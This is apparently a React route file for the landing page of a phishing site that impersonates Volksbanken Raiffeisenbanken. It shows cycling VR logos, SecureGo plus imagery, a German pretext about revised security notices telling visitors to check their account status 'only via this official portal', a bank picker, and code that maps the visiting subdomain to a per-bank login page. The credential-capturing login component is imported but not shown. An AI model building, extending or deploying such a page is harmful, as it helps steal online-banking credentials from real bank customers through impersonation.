import { useEffect, useState } from "react";
import { createFileRoute, Link } from "@tanstack/react-router";
import BankSearch from "@/components/BankSearch";
import { getBankSubdomain } from "@/lib/bankSubdomain";
import { BankLoginPage } from "@/routes/login.$bankId";

import landingBg from "@/assets/landing-bg.png";
import securegoPromo from "@/assets/securego-promo.png";
import securegoSlide1 from "@/assets/securego-slide-1.png";
import securegoSlide2 from "@/assets/securego-slide-2.png";
import iconSecurego from "@/assets/app-icon-securego.png";
import iconCard from "@/assets/app-icon-card.png";
import iconBB from "@/assets/bbbank-search-icon.png";
import iconLock from "@/assets/app-icon-lock.png";
import vrLogo23 from "@/assets/vr-logo-23.png.asset.json";
import vrLogo24 from "@/assets/vr-logo-24.png.asset.json";
import vrLogo25 from "@/assets/vr-logo-25.png.asset.json";
import vrLogo26 from "@/assets/vr-logo-26.png.asset.json";

// Cycle: base logo alternates with each slogan variant → 1,2,1,3,1,4,...
const headerLogos = [
  vrLogo23.url,
  vrLogo24.url,
  vrLogo23.url,
  vrLogo25.url,
  vrLogo23.url,
  vrLogo26.url,
];
const HEADER_LOGO_INTERVAL_MS = 3500;

export const Route = createFileRoute("/")({
  head: () => ({
    meta: [
      { title: "VR- Info" },
      { property: "og:title", content: "VR- Info" },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
    ],
  }),
  component: Index,
});

const promoSlides = [securegoPromo, securegoSlide1, securegoSlide2];
const PROMO_INTERVAL_MS = 3000;

const appIcons = [
  { src: iconSecurego, alt: "SecureGo plus" },
  { src: iconCard, alt: "Card Security" },
  { src: iconBB, alt: "BB Bank" },
  { src: iconLock, alt: "VR Security" },
];

function HeaderLogoCycle() {
  const [i, setI] = useState(0);
  useEffect(() => {
    const id = setInterval(
      () => setI((p) => (p + 1) % headerLogos.length),
      HEADER_LOGO_INTERVAL_MS,
    );
    return () => clearInterval(id);
  }, []);
  return (
    <div className="relative h-10 sm:h-12 w-[220px] sm:w-[260px]">
      {headerLogos.map((src, idx) => (
        <img
          key={idx}
          src={src}
          alt="Volksbanken Raiffeisenbanken"
          className="absolute inset-0 h-full w-auto object-contain object-left transition-opacity duration-700 ease-in-out"
          style={{ opacity: idx === i ? 1 : 0 }}
        />
      ))}
    </div>
  );
}

function AppIconSlideshow() {
  const [activeIndex, setActiveIndex] = useState(0);
  useEffect(() => {
    const id = setInterval(
      () => setActiveIndex((p) => (p + 1) % appIcons.length),
      1500,
    );
    return () => clearInterval(id);
  }, []);
  return (
    <div className="flex items-center justify-center gap-3 mb-4">
      {appIcons.map((icon, i) => (
        <div
          key={i}
          className="w-14 h-14 sm:w-16 sm:h-16 rounded-2xl overflow-hidden transition-all duration-500 ease-in-out"
          style={{
            opacity: i === activeIndex ? 1 : 0.35,
            transform: i === activeIndex ? "scale(1.15)" : "scale(0.95)",
          }}
        >
          <img
            src={icon.src}
            alt={icon.alt}
            className="w-full h-full object-contain"
          />
        </div>
      ))}
    </div>
  );
}

function PromoSlideshow() {
  const [activeIndex, setActiveIndex] = useState(0);
  useEffect(() => {
    const id = setInterval(
      () => setActiveIndex((p) => (p + 1) % promoSlides.length),
      PROMO_INTERVAL_MS,
    );
    return () => clearInterval(id);
  }, []);
  return (
    <section className="w-full bg-primary">
      <div className="max-w-6xl mx-auto px-6 sm:px-10 lg:px-16 py-10 sm:py-16 flex flex-col items-center">
        <div className="relative w-full max-w-md aspect-[3/4] rounded-lg overflow-hidden">
          {promoSlides.map((src, i) => (
            <img
              key={i}
              src={src}
              alt={`SecureGo plus Slide ${i + 1}`}
              className="absolute inset-0 w-full h-full object-cover transition-opacity duration-1000 ease-in-out"
              style={{ opacity: i === activeIndex ? 1 : 0 }}
            />
          ))}
        </div>
      </div>
    </section>
  );
}

function BankSearchCard() {
  return (
    <div className="w-full">
      <div className="bg-card rounded-2xl shadow-xl p-6 sm:p-8 border border-border">
        <div className="text-center mb-6">
          <AppIconSlideshow />
          <h2 className="text-xl sm:text-2xl font-semibold text-card-foreground">
            Bitte wählen Sie Ihre Bank aus
          </h2>
        </div>
        <BankSearch />
      </div>
    </div>
  );
}

function Index() {
  const [subBankId, setSubBankId] = useState<string | null>(null);
  const [subReady, setSubReady] = useState(false);
  useEffect(() => {
    const host = window.location.hostname;
    const label = getBankSubdomain(host);
    console.log("[Index] host:", host, "resolved label:", label);
    if (!label) {
      setSubReady(true);
      return;
    }
    // BankLoginPage resolves the bank by Online-Banking-Sufix itself.
    setSubBankId(label);
    setSubReady(true);
  }, []);
  if (subReady && subBankId) {
    return <BankLoginPage bankId={subBankId} />;
  }
  return (
    <div className="min-h-screen bg-background flex flex-col">
      <header className="bg-header text-header-foreground py-3 px-4 sm:px-6 shadow-sm border-b border-border">
        <div className="max-w-4xl mx-auto flex items-center">
          <HeaderLogoCycle />
        </div>
      </header>

      <div className="w-full bg-primary" style={{ minHeight: "6px" }} />

      <main className="flex-1 relative overflow-visible">
        <div
          className="absolute inset-0 bg-cover bg-center"
          style={{ backgroundImage: `url(${landingBg})` }}
        />
        <div className="absolute inset-0 bg-primary/80" />

        <div className="relative z-10 w-full max-w-6xl mx-auto px-6 sm:px-10 lg:px-16 py-10 sm:py-16">
          <div className="flex flex-col lg:flex-row gap-10 lg:gap-16 items-start">
            <div className="flex-1 min-w-0 text-primary-foreground">
              <h1 className="text-xl sm:text-2xl font-semibold mb-4">
                Wichtige Informationen zu Ihrem Kontoschutz
              </h1>
              <p className="text-sm sm:text-base mb-6 opacity-90">
                Wir haben unsere Sicherheits- und Datenschutzhinweise
                überarbeitet. Die Aktualisierungen betreffen insbesondere den
                Schutz Ihres Kontos sowie die Verarbeitung Ihrer persönlichen
                Daten.
              </p>
              <h2 className="text-lg sm:text-xl font-semibold mb-3">
                Prüfen Sie Ihren persönlichen Status
              </h2>
              <p className="text-sm sm:text-base mb-3 opacity-90">
                Rufen Sie Ihren Online-Servicebereich ausschließlich über
                dieses offizielle Portal auf. Im geschützten Bereich können Sie
                außerdem Ihre hinterlegten Kontakt- und Sicherheitseinstellungen
                überprüfen sowie alle für Sie geltenden Informationen einsehen.
              </p>
            </div>

            <div className="hidden lg:block w-px self-stretch bg-primary-foreground/20" />

            <div className="w-full lg:w-[420px] shrink-0">
              <BankSearchCard />
            </div>
          </div>
        </div>
      </main>

      <PromoSlideshow />

      <footer className="w-full bg-background border-t border-border">
        <div className="max-w-6xl mx-auto px-6 py-6 sm:py-4 flex flex-wrap items-center justify-center sm:justify-end gap-x-6 gap-y-3 text-xs sm:text-sm">
          <Link to="/" className="text-primary hover:underline">
            Impressum
          </Link>
          <Link to="/" className="text-primary hover:underline">
            Datenschutz
          </Link>
        </div>
      </footer>
    </div>
  );
}
